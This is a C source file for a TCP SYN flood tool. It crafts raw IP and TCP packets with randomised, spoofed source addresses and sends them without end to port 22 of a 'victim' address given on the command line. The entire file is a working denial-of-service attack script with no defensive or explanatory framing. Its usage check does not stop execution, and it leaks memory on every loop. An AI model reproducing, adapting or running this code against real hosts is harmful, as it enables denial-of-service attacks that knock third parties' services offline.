#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>


#define IP_HEADER_LEN sizeof(struct ip)
#define TCP_HEADER_LEN sizeof(struct tcphdr)

const char* victim = "127.0.0.1";

void initIPHeader(struct ip* header, unsigned short len) {
	header->ip_v = IPVERSION;
	header->ip_hl = sizeof(struct ip) / 4;
	header->ip_tos = 0;
	header->ip_len = htons(IP_HEADER_LEN + TCP_HEADER_LEN);
	header->ip_id = 0;
	header->ip_off = 0;
	header->ip_ttl = MAXTTL;
	header->ip_p = IPPROTO_TCP;
	header->ip_sum = 0;
	header->ip_src.s_addr = random();
	inet_pton(AF_INET, victim, &header->ip_dst.s_addr);
}

void initTCPHeader(struct tcphdr* header) {
	header->source = htons(9431);
	header->dest = htons(22);

	header->doff = sizeof(struct tcphdr) / 4;
	header->syn = 1;
	header->window = htons(4096);
	header->check = 0;
	header->seq = htonl(rand());
	header->ack_seq = 0;
}

struct psdHeader {
	unsigned int srcIP;
	unsigned int destIP;
	unsigned short zero:8;
	unsigned short proto:8;
	unsigned short totalLen;
};

void initPsdHeader(struct psdHeader* header, struct ip* iHeader) {
	header->srcIP = iHeader->ip_src.s_addr;
	header->destIP = iHeader->ip_dst.s_addr;

	header->zero = 0;
	header->proto = IPPROTO_TCP;
	header->totalLen = htons(0x0014);
}

unsigned short calcTCPCheckSum(const char* buf) {
	size_t size = TCP_HEADER_LEN + sizeof(struct psdHeader);
	unsigned int checkSum = 0;
	for (int i = 0; i < size; i += 2) {
		unsigned short first = (unsigned short)buf[i] << 8;
		unsigned short second = (unsigned short)buf[i+1] & 0x00ff;
		checkSum += first + second;
	}
	while (1) {
		unsigned short c = (checkSum >> 16);
		if (c > 0) {
			checkSum = (checkSum << 16) >> 16;
			checkSum += c;
		} else {
			break;
		}
	}
	return ~checkSum;
}

int main(int argc, char** argv) {
    if(argc < 2)
    {
        perror("usage: ./test ip address\n");
    }

    victim = argv[1];

	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock < 0) {
		perror("Socket Error");
		exit(1);
	}
	const int on = 1;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

	const char* query = "test.\n";

	while(1)
    {

	struct tcphdr* tHeader = (struct tcphdr*) malloc(sizeof(struct tcphdr));
	memset(tHeader, 0, TCP_HEADER_LEN);
	initTCPHeader(tHeader);
	struct ip* iHeader = (struct ip*) malloc(sizeof(struct ip));
	memset(iHeader, 0, IP_HEADER_LEN);
	initIPHeader(iHeader, strlen(query));
	struct psdHeader* pHeader = (struct psdHeader*) malloc(sizeof(struct psdHeader));
	initPsdHeader(pHeader, iHeader);

	char sumBuf[TCP_HEADER_LEN + sizeof(struct psdHeader)];
	memset(sumBuf, 0, TCP_HEADER_LEN + sizeof(struct psdHeader));
	memcpy(sumBuf, pHeader, sizeof(struct psdHeader));
	memcpy(sumBuf + sizeof(struct psdHeader), tHeader, TCP_HEADER_LEN);

	int ni = memcmp(sumBuf, pHeader, sizeof(struct psdHeader));
	if (ni != 0) {
		perror("Compare");
	}
	ni = memcmp(sumBuf + sizeof(struct psdHeader), tHeader, TCP_HEADER_LEN);
	if (ni != 0) {
		perror("Compare 2");
	}

	tHeader->check = htons(calcTCPCheckSum(sumBuf));

	int totalLen = IP_HEADER_LEN + TCP_HEADER_LEN;
	char buf[totalLen];

	memcpy(buf, iHeader, IP_HEADER_LEN);
	memcpy(buf + IP_HEADER_LEN, tHeader, TCP_HEADER_LEN);

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	inet_pton(AF_INET, victim, &addr.sin_addr.s_addr);
	addr.sin_port = htons(22);

	socklen_t len = sizeof(struct sockaddr_in);
	int n = sendto(sock, buf, totalLen, 0, (struct sockaddr*)&addr, len);
	if (n < 0) {
		perror("Send Error");
	}

	struct in_addr ip_src;
	ip_src.s_addr = iHeader->ip_src.s_addr;

	printf("random ip: %s\n", inet_ntoa(ip_src) );

    }


	return 0;
}

